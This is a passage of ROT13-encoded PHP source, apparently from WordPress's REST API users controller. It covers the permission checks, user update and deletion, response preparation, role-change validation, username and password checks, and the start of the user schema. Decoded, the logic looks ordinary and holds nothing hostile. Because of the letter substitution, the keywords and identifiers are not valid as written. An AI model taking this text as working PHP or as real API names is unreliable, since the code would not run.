	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb hcqngr gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba hcqngr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$hfre = $guvf->trg_hfre( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $hfre ) ) {
			erghea $hfre;
		}

		vs ( ! rzcgl( $erdhrfg['ebyrf'] ) ) {
			vs ( ! pheerag_hfre_pna( 'cebzbgr_hfre', $hfre->VQ ) ) {
				erghea arj JC_Reebe(
					'erfg_pnaabg_rqvg_ebyrf',
					__( 'Fbeel, lbh ner abg nyybjrq gb rqvg ebyrf bs guvf hfre.' ),
					neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
				);
			}

			$erdhrfg_cnenzf = neenl_xrlf( $erdhrfg->trg_cnenzf() );
			fbeg( $erdhrfg_cnenzf );
			/*
			 * Vs bayl 'vq' naq 'ebyrf' ner fcrpvsvrq (jr ner bayl gelvat gb
			 * rqvg ebyrf), gura bayl gur 'cebzbgr_hfre' pnc vf erdhverq.
			 */
			vs ( neenl( 'vq', 'ebyrf' ) === $erdhrfg_cnenzf ) {
				erghea gehr;
			}
		}

		vs ( ! pheerag_hfre_pna( 'rqvg_hfre', $hfre->VQ ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_rqvg',
				__( 'Fbeel, lbh ner abg nyybjrq gb rqvg guvf hfre.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Hcqngrf n fvatyr hfre.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba hcqngr_vgrz( $erdhrfg ) {
		$hfre = $guvf->trg_hfre( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $hfre ) ) {
			erghea $hfre;
		}

		$vq = $hfre->VQ;

		$bjare_vq = snyfr;
		vs ( vf_fgevat( $erdhrfg['rznvy'] ) ) {
			$bjare_vq = rznvy_rkvfgf( $erdhrfg['rznvy'] );
		}

		vs ( $bjare_vq && $bjare_vq !== $vq ) {
			erghea arj JC_Reebe(
				'erfg_hfre_vainyvq_rznvy',
				__( 'Vainyvq rznvy nqqerff.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		vs ( ! rzcgl( $erdhrfg['hfreanzr'] ) && $erdhrfg['hfreanzr'] !== $hfre->hfre_ybtva ) {
			erghea arj JC_Reebe(
				'erfg_hfre_vainyvq_nethzrag',
				__( 'Hfreanzr vf abg rqvgnoyr.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		vs ( ! rzcgl( $erdhrfg['fyht'] ) && $erdhrfg['fyht'] !== $hfre->hfre_avpranzr && trg_hfre_ol( 'fyht', $erdhrfg['fyht'] ) ) {
			erghea arj JC_Reebe(
				'erfg_hfre_vainyvq_fyht',
				__( 'Vainyvq fyht.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		vs ( ! rzcgl( $erdhrfg['ebyrf'] ) ) {
			$purpx_crezvffvba = $guvf->purpx_ebyr_hcqngr( $vq, $erdhrfg['ebyrf'] );

			vs ( vf_jc_reebe( $purpx_crezvffvba ) ) {
				erghea $purpx_crezvffvba;
			}
		}

		$hfre = $guvf->cercner_vgrz_sbe_qngnonfr( $erdhrfg );

		// Rafher jr'er bcrengvat ba gur fnzr hfre jr nyernql purpxrq.
		$hfre->VQ = $vq;

		$hfre_vq = jc_hcqngr_hfre( jc_fynfu( (neenl) $hfre ) );

		vs ( vf_jc_reebe( $hfre_vq ) ) {
			erghea $hfre_vq;
		}

		$hfre = trg_hfre_ol( 'vq', $hfre_vq );

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-hfref-pbagebyyre.cuc */
		qb_npgvba( 'erfg_vafreg_hfre', $hfre, $erdhrfg, snyfr );

		vs ( ! rzcgl( $erdhrfg['ebyrf'] ) ) {
			neenl_znc( neenl( $hfre, 'nqq_ebyr' ), $erdhrfg['ebyrf'] );
		}

		$fpurzn = $guvf->trg_vgrz_fpurzn();

		vs ( ! rzcgl( $fpurzn['cebcregvrf']['zrgn'] ) && vffrg( $erdhrfg['zrgn'] ) ) {
			$zrgn_hcqngr = $guvf->zrgn->hcqngr_inyhr( $erdhrfg['zrgn'], $vq );

			vs ( vf_jc_reebe( $zrgn_hcqngr ) ) {
				erghea $zrgn_hcqngr;
			}
		}

		$hfre          = trg_hfre_ol( 'vq', $hfre_vq );
		$svryqf_hcqngr = $guvf->hcqngr_nqqvgvbany_svryqf_sbe_bowrpg( $hfre, $erdhrfg );

		vs ( vf_jc_reebe( $svryqf_hcqngr ) ) {
			erghea $svryqf_hcqngr;
		}

		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-hfref-pbagebyyre.cuc */
		qb_npgvba( 'erfg_nsgre_vafreg_hfre', $hfre, $erdhrfg, snyfr );

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $hfre, $erdhrfg );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );

		erghea $erfcbafr;
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb hcqngr gur pheerag hfre.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb hcqngr gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba hcqngr_pheerag_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$erdhrfg['vq'] = trg_pheerag_hfre_vq();

		erghea $guvf->hcqngr_vgrz_crezvffvbaf_purpx( $erdhrfg );
	}

	/**
	 * Hcqngrf gur pheerag hfre.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba hcqngr_pheerag_vgrz( $erdhrfg ) {
		$erdhrfg['vq'] = trg_pheerag_hfre_vq();

		erghea $guvf->hcqngr_vgrz( $erdhrfg );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff qryrgr n hfre.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb qryrgr gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba qryrgr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$hfre = $guvf->trg_hfre( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $hfre ) ) {
			erghea $hfre;
		}

		vs ( ! pheerag_hfre_pna( 'qryrgr_hfre', $hfre->VQ ) ) {
			erghea arj JC_Reebe(
				'erfg_hfre_pnaabg_qryrgr',
				__( 'Fbeel, lbh ner abg nyybjrq gb qryrgr guvf hfre.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Qryrgrf n fvatyr hfre.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba qryrgr_vgrz( $erdhrfg ) {
		// Jr qba'g fhccbeg qryrgr erdhrfgf va zhygvfvgr.
		vs ( vf_zhygvfvgr() ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_qryrgr',
				__( 'Gur hfre pnaabg or qryrgrq.' ),
				neenl( 'fgnghf' => 501 )
			);
		}

		$hfre = $guvf->trg_hfre( $erdhrfg['vq'] );

		vs ( vf_jc_reebe( $hfre ) ) {
			erghea $hfre;
		}

		$vq       = $hfre->VQ;
		$ernffvta = snyfr === $erdhrfg['ernffvta'] ? ahyy : nofvag( $erdhrfg['ernffvta'] );
		$sbepr    = vffrg( $erdhrfg['sbepr'] ) ? (obby) $erdhrfg['sbepr'] : snyfr;

		// Jr qba'g fhccbeg genfuvat sbe hfref.
		vs ( ! $sbepr ) {
			erghea arj JC_Reebe(
				'erfg_genfu_abg_fhccbegrq',
				/* genafyngbef: %f: sbepr=gehr */
				fcevags( __( \"Hfref qb abg fhccbeg genfuvat. Frg '%f' gb qryrgr.\" ), 'sbepr=gehr' ),
				neenl( 'fgnghf' => 501 )
			);
		}

		vs ( ! rzcgl( $ernffvta ) ) {
			vs ( $ernffvta === $vq || ! trg_hfreqngn( $ernffvta ) ) {
				erghea arj JC_Reebe(
					'erfg_hfre_vainyvq_ernffvta',
					__( 'Vainyvq hfre VQ sbe ernffvtazrag.' ),
					neenl( 'fgnghf' => 400 )
				);
			}
		}

		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );

		$cerivbhf = $guvf->cercner_vgrz_sbe_erfcbafr( $hfre, $erdhrfg );

		// Vapyhqr hfre nqzva shapgvbaf gb trg npprff gb jc_qryrgr_hfre().
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/hfre.cuc';

		$erfhyg = jc_qryrgr_hfre( $vq, $ernffvta );

		vs ( ! $erfhyg ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_qryrgr',
				__( 'Gur hfre pnaabg or qryrgrq.' ),
				neenl( 'fgnghf' => 500 )
			);
		}

		$erfcbafr = arj JC_ERFG_Erfcbafr();
		$erfcbafr->frg_qngn(
			neenl(
				'qryrgrq'  => gehr,
				'cerivbhf' => $cerivbhf->trg_qngn(),
			)
		);

		/**
		 * Sverf vzzrqvngryl nsgre n hfre vf qryrgrq ivn gur ERFG NCV.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz JC_Hfre          $hfre     Gur hfre qngn.
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Gur erfcbafr erghearq sebz gur NCV.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg  Gur erdhrfg frag gb gur NCV.
		 */
		qb_npgvba( 'erfg_qryrgr_hfre', $hfre, $erfcbafr, $erdhrfg );

		erghea $erfcbafr;
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb qryrgr gur pheerag hfre.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb qryrgr gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba qryrgr_pheerag_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$erdhrfg['vq'] = trg_pheerag_hfre_vq();

		erghea $guvf->qryrgr_vgrz_crezvffvbaf_purpx( $erdhrfg );
	}

	/**
	 * Qryrgrf gur pheerag hfre.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba qryrgr_pheerag_vgrz( $erdhrfg ) {
		$erdhrfg['vq'] = trg_pheerag_hfre_vq();

		erghea $guvf->qryrgr_vgrz( $erdhrfg );
	}

	/**
	 * Cercnerf n fvatyr hfre bhgchg sbe erfcbafr.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 5.9.0 Eranzrq `$hfre` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz JC_Hfre         $vgrz    Hfre bowrpg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr bowrpg.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$hfre = $vgrz;

		// Qba'g cercner gur erfcbafr obql sbe URNQ erdhrfgf.
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-hfref-pbagebyyre.cuc */
			erghea nccyl_svygref( 'erfg_cercner_hfre', arj JC_ERFG_Erfcbafr( neenl() ), $hfre, $erdhrfg );
		}

		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$qngn   = neenl();

		vs ( va_neenl( 'vq', $svryqf, gehr ) ) {
			$qngn['vq'] = $hfre->VQ;
		}

		vs ( va_neenl( 'hfreanzr', $svryqf, gehr ) ) {
			$qngn['hfreanzr'] = $hfre->hfre_ybtva;
		}

		vs ( va_neenl( 'anzr', $svryqf, gehr ) ) {
			$qngn['anzr'] = $hfre->qvfcynl_anzr;
		}

		vs ( va_neenl( 'svefg_anzr', $svryqf, gehr ) ) {
			$qngn['svefg_anzr'] = $hfre->svefg_anzr;
		}

		vs ( va_neenl( 'ynfg_anzr', $svryqf, gehr ) ) {
			$qngn['ynfg_anzr'] = $hfre->ynfg_anzr;
		}

		vs ( va_neenl( 'rznvy', $svryqf, gehr ) ) {
			$qngn['rznvy'] = $hfre->hfre_rznvy;
		}

		vs ( va_neenl( 'hey', $svryqf, gehr ) ) {
			$qngn['hey'] = $hfre->hfre_hey;
		}

		vs ( va_neenl( 'qrfpevcgvba', $svryqf, gehr ) ) {
			$qngn['qrfpevcgvba'] = $hfre->qrfpevcgvba;
		}

		vs ( va_neenl( 'yvax', $svryqf, gehr ) ) {
			$qngn['yvax'] = trg_nhgube_cbfgf_hey( $hfre->VQ, $hfre->hfre_avpranzr );
		}

		vs ( va_neenl( 'ybpnyr', $svryqf, gehr ) ) {
			$qngn['ybpnyr'] = trg_hfre_ybpnyr( $hfre );
		}

		vs ( va_neenl( 'avpxanzr', $svryqf, gehr ) ) {
			$qngn['avpxanzr'] = $hfre->avpxanzr;
		}

		vs ( va_neenl( 'fyht', $svryqf, gehr ) ) {
			$qngn['fyht'] = $hfre->hfre_avpranzr;
		}

		vs ( va_neenl( 'ebyrf', $svryqf, gehr ) ) {
			// Qrsrafviryl pnyy neenl_inyhrf() gb rafher na neenl vf erghearq.
			$qngn['ebyrf'] = neenl_inyhrf( $hfre->ebyrf );
		}

		vs ( va_neenl( 'ertvfgrerq_qngr', $svryqf, gehr ) ) {
			$qngn['ertvfgrerq_qngr'] = tzqngr( 'p', fgegbgvzr( $hfre->hfre_ertvfgrerq ) );
		}

		vs ( va_neenl( 'pncnovyvgvrf', $svryqf, gehr ) ) {
			$qngn['pncnovyvgvrf'] = (bowrpg) $hfre->nyypncf;
		}

		vs ( va_neenl( 'rkgen_pncnovyvgvrf', $svryqf, gehr ) ) {
			$qngn['rkgen_pncnovyvgvrf'] = (bowrpg) $hfre->pncf;
		}

		vs ( va_neenl( 'ningne_heyf', $svryqf, gehr ) ) {
			$qngn['ningne_heyf'] = erfg_trg_ningne_heyf( $hfre );
		}

		vs ( va_neenl( 'zrgn', $svryqf, gehr ) ) {
			$qngn['zrgn'] = $guvf->zrgn->trg_inyhr( $hfre->VQ, $erdhrfg );
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'rzorq';

		$qngn = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );
		$qngn = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		// Jenc gur qngn va n erfcbafr bowrpg.
		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$erfcbafr->nqq_yvaxf( $guvf->cercner_yvaxf( $hfre ) );
		}

		/**
		 * Svygref hfre qngn erghearq sebz gur ERFG NCV.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Gur erfcbafr bowrpg.
		 * @cnenz JC_Hfre          $hfre     Hfre bowrpg hfrq gb perngr erfcbafr.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg  Erdhrfg bowrpg.
		 */
		erghea nccyl_svygref( 'erfg_cercner_hfre', $erfcbafr, $hfre, $erdhrfg );
	}

	/**
	 * Cercnerf yvaxf sbe gur hfre erdhrfg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_Hfre $hfre Hfre bowrpg.
	 * @erghea neenl Yvaxf sbe gur tvira hfre.
	 */
	cebgrpgrq shapgvba cercner_yvaxf( $hfre ) {
		$yvaxf = neenl(
			'frys'       => neenl(
				'uers' => erfg_hey( fcevags( '%f/%f/%q', $guvf->anzrfcnpr, $guvf->erfg_onfr, $hfre->VQ ) ),
			),
			'pbyyrpgvba' => neenl(
				'uers' => erfg_hey( fcevags( '%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr ) ),
			),
		);

		erghea $yvaxf;
	}

	/**
	 * Cercnerf n fvatyr hfre sbe perngvba be hcqngr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea bowrpg Hfre bowrpg.
	 */
	cebgrpgrq shapgvba cercner_vgrz_sbe_qngnonfr( $erdhrfg ) {
		$cercnerq_hfre = arj fgqPynff();

		$fpurzn = $guvf->trg_vgrz_fpurzn();

		// Erdhverq nethzragf.
		vs ( vffrg( $erdhrfg['rznvy'] ) && ! rzcgl( $fpurzn['cebcregvrf']['rznvy'] ) ) {
			$cercnerq_hfre->hfre_rznvy = $erdhrfg['rznvy'];
		}

		vs ( vffrg( $erdhrfg['hfreanzr'] ) && ! rzcgl( $fpurzn['cebcregvrf']['hfreanzr'] ) ) {
			$cercnerq_hfre->hfre_ybtva = $erdhrfg['hfreanzr'];
		}

		vs ( vffrg( $erdhrfg['cnffjbeq'] ) && ! rzcgl( $fpurzn['cebcregvrf']['cnffjbeq'] ) ) {
			$cercnerq_hfre->hfre_cnff = $erdhrfg['cnffjbeq'];
		}

		// Bcgvbany nethzragf.
		vs ( vffrg( $erdhrfg['vq'] ) ) {
			$cercnerq_hfre->VQ = nofvag( $erdhrfg['vq'] );
		}

		vs ( vffrg( $erdhrfg['anzr'] ) && ! rzcgl( $fpurzn['cebcregvrf']['anzr'] ) ) {
			$cercnerq_hfre->qvfcynl_anzr = $erdhrfg['anzr'];
		}

		vs ( vffrg( $erdhrfg['svefg_anzr'] ) && ! rzcgl( $fpurzn['cebcregvrf']['svefg_anzr'] ) ) {
			$cercnerq_hfre->svefg_anzr = $erdhrfg['svefg_anzr'];
		}

		vs ( vffrg( $erdhrfg['ynfg_anzr'] ) && ! rzcgl( $fpurzn['cebcregvrf']['ynfg_anzr'] ) ) {
			$cercnerq_hfre->ynfg_anzr = $erdhrfg['ynfg_anzr'];
		}

		vs ( vffrg( $erdhrfg['avpxanzr'] ) && ! rzcgl( $fpurzn['cebcregvrf']['avpxanzr'] ) ) {
			$cercnerq_hfre->avpxanzr = $erdhrfg['avpxanzr'];
		}

		vs ( vffrg( $erdhrfg['fyht'] ) && ! rzcgl( $fpurzn['cebcregvrf']['fyht'] ) ) {
			$cercnerq_hfre->hfre_avpranzr = $erdhrfg['fyht'];
		}

		vs ( vffrg( $erdhrfg['qrfpevcgvba'] ) && ! rzcgl( $fpurzn['cebcregvrf']['qrfpevcgvba'] ) ) {
			$cercnerq_hfre->qrfpevcgvba = $erdhrfg['qrfpevcgvba'];
		}

		vs ( vffrg( $erdhrfg['hey'] ) && ! rzcgl( $fpurzn['cebcregvrf']['hey'] ) ) {
			$cercnerq_hfre->hfre_hey = $erdhrfg['hey'];
		}

		vs ( vffrg( $erdhrfg['ybpnyr'] ) && ! rzcgl( $fpurzn['cebcregvrf']['ybpnyr'] ) ) {
			$cercnerq_hfre->ybpnyr = $erdhrfg['ybpnyr'];
		}

		// Frggvat ebyrf jvyy or unaqyrq bhgfvqr bs guvf shapgvba.
		vs ( vffrg( $erdhrfg['ebyrf'] ) ) {
			$cercnerq_hfre->ebyr = snyfr;
		}

		/**
		 * Svygref hfre qngn orsber vafregvba ivn gur ERFG NCV.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz bowrpg          $cercnerq_hfre Hfre bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg       Erdhrfg bowrpg.
		 */
		erghea nccyl_svygref( 'erfg_cer_vafreg_hfre', $cercnerq_hfre, $erdhrfg );
	}

	/**
	 * Qrgrezvarf vs gur pheerag hfre vf nyybjrq gb znxr gur qrfverq ebyrf punatr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @tybony JC_Ebyrf $jc_ebyrf JbeqCerff ebyr znantrzrag bowrpg.
	 *
	 * @cnenz vag   $hfre_vq Hfre VQ.
	 * @cnenz neenl $ebyrf   Arj hfre ebyrf.
	 * @erghea gehr|JC_Reebe Gehr vs gur pheerag hfre vf nyybjrq gb znxr gur ebyr punatr,
	 *                       bgurejvfr n JC_Reebe bowrpg.
	 */
	cebgrpgrq shapgvba purpx_ebyr_hcqngr( $hfre_vq, $ebyrf ) {
		tybony $jc_ebyrf;

		sbernpu ( $ebyrf nf $ebyr ) {

			vs ( ! vffrg( $jc_ebyrf->ebyr_bowrpgf[ $ebyr ] ) ) {
				erghea arj JC_Reebe(
					'erfg_hfre_vainyvq_ebyr',
					/* genafyngbef: %f: Ebyr xrl. */
					fcevags( __( 'Gur ebyr %f qbrf abg rkvfg.' ), $ebyr ),
					neenl( 'fgnghf' => 400 )
				);
			}

			$cbgragvny_ebyr = $jc_ebyrf->ebyr_bowrpgf[ $ebyr ];

			/*
			 * Qba'g yrg nalbar jvgu 'rqvg_hfref' (nqzvaf) rqvg gurve bja ebyr gb fbzrguvat jvgubhg vg.
			 * Zhygvfvgr fhcre nqzvaf pna serryl rqvg gurve oybt ebyrf -- gurl cbffrff nyy pncf.
			 */
			vs ( ! ( vf_zhygvfvgr()
				&& pheerag_hfre_pna( 'znantr_fvgrf' ) )
				&& trg_pheerag_hfre_vq() === $hfre_vq
				&& ! $cbgragvny_ebyr->unf_pnc( 'rqvg_hfref' )
			) {
				erghea arj JC_Reebe(
					'erfg_hfre_vainyvq_ebyr',
					__( 'Fbeel, lbh ner abg nyybjrq gb tvir hfref gung ebyr.' ),
					neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
				);
			}

			// Vapyhqr hfre nqzva shapgvbaf gb trg npprff gb trg_rqvgnoyr_ebyrf().
			erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/hfre.cuc';

			// Gur arj ebyr zhfg or rqvgnoyr ol gur ybttrq-va hfre.
			$rqvgnoyr_ebyrf = trg_rqvgnoyr_ebyrf();

			vs ( rzcgl( $rqvgnoyr_ebyrf[ $ebyr ] ) ) {
				erghea arj JC_Reebe(
					'erfg_hfre_vainyvq_ebyr',
					__( 'Fbeel, lbh ner abg nyybjrq gb tvir hfref gung ebyr.' ),
					neenl( 'fgnghf' => 403 )
				);
			}
		}

		erghea gehr;
	}

	/**
	 * Purpx n hfreanzr sbe gur ERFG NCV.
	 *
	 * Cresbezf n pbhcyr bs purpxf yvxr rqvg_hfre() va jc-nqzva/vapyhqrf/hfre.cuc.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat          $inyhr   Gur hfreanzr fhozvggrq va gur erdhrfg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @cnenz fgevat          $cnenz   Gur cnenzrgre anzr.
	 * @erghea fgevat|JC_Reebe Gur fnavgvmrq hfreanzr, vs inyvq, bgurejvfr na reebe.
	 */
	choyvp shapgvba purpx_hfreanzr( $inyhr, $erdhrfg, $cnenz ) {
		$hfreanzr = (fgevat) $inyhr;

		vs ( ! inyvqngr_hfreanzr( $hfreanzr ) ) {
			erghea arj JC_Reebe(
				'erfg_hfre_vainyvq_hfreanzr',
				__( 'Guvf hfreanzr vf vainyvq orpnhfr vg hfrf vyyrtny punenpgref. Cyrnfr ragre n inyvq hfreanzr.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/hfre.cuc */
		$vyyrtny_ybtvaf = (neenl) nccyl_svygref( 'vyyrtny_hfre_ybtvaf', neenl() );

		vs ( va_neenl( fgegbybjre( $hfreanzr ), neenl_znc( 'fgegbybjre', $vyyrtny_ybtvaf ), gehr ) ) {
			erghea arj JC_Reebe(
				'erfg_hfre_vainyvq_hfreanzr',
				__( 'Fbeel, gung hfreanzr vf abg nyybjrq.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		erghea $hfreanzr;
	}

	/**
	 * Purpx n hfre cnffjbeq sbe gur ERFG NCV.
	 *
	 * Cresbezf n pbhcyr bs purpxf yvxr rqvg_hfre() va jc-nqzva/vapyhqrf/hfre.cuc.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat          $inyhr   Gur cnffjbeq fhozvggrq va gur erdhrfg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @cnenz fgevat          $cnenz   Gur cnenzrgre anzr.
	 * @erghea fgevat|JC_Reebe Gur fnavgvmrq cnffjbeq, vs inyvq, bgurejvfr na reebe.
	 */
	choyvp shapgvba purpx_hfre_cnffjbeq(
		#[\FrafvgvirCnenzrgre]
		$inyhr,
		$erdhrfg,
		$cnenz
	) {
		$cnffjbeq = (fgevat) $inyhr;

		vs ( rzcgl( $cnffjbeq ) ) {
			erghea arj JC_Reebe(
				'erfg_hfre_vainyvq_cnffjbeq',
				__( 'Cnffjbeqf pnaabg or rzcgl.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		vs ( fge_pbagnvaf( $cnffjbeq, '\\' ) ) {
			erghea arj JC_Reebe(
				'erfg_hfre_vainyvq_cnffjbeq',
				fcevags(
					/* genafyngbef: %f: Gur '\' punenpgre. */
					__( 'Cnffjbeqf pnaabg pbagnva gur \"%f\" punenpgre.' ),
					'\\'
				),
				neenl( 'fgnghf' => 400 )
			);
		}

		erghea $cnffjbeq;
	}

	/**
	 * Ergevrirf gur hfre'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => 'hfre',
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'vq'                 => neenl(
					'qrfpevcgvba' => __( 'Havdhr vqragvsvre sbe gur hfre.' ),
					'glcr'        => 'vagrtre',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'hfreanzr'           => neenl(
					'qrfpevcgvba' => __( 'Ybtva anzr sbe gur hfre.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rqvg' ),
					'erdhverq'    => gehr,
					'net_bcgvbaf' => neenl(
						'fnavgvmr_pnyyonpx' => neenl( $guvf, 'purpx_hfreanzr' ),
					),
				),
				'anzr'               => neenl(
					'qrfpevcgvba' => __( 'Qvfcynl anzr sbe gur hfre.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'net_bcgvbaf' => neenl(
						'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
					),
				),
				'svefg_anzr'         => neenl(
					'qrfpevcgvba' => __( 'Svefg anzr sbe gur hfre.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rqvg' ),
					'net_bcgvbaf' => neenl(
						'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
					),
				),
				'ynfg_anzr'          => neenl(
					'qrfpevcgvba' => __( 'Ynfg anzr sbe gur hfre.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rqvg' ),
					'net_bcgvbaf' => neenl(
						'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
					),
				),
				'rznvy'              => neenl(
					'qrfpevcgvba' => __( 'Gur rznvy nqqerff sbe gur hfre.' ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'rznvy',
					'pbagrkg'     => neenl( 'rqvg' ),
					'erdhverq'    => gehr,
				),
				'hey'                => neenl(
					'qrfpevcgvba' => __( 'HEY bs gur hfre.' ),
					'glcr'        => 'fgevat',
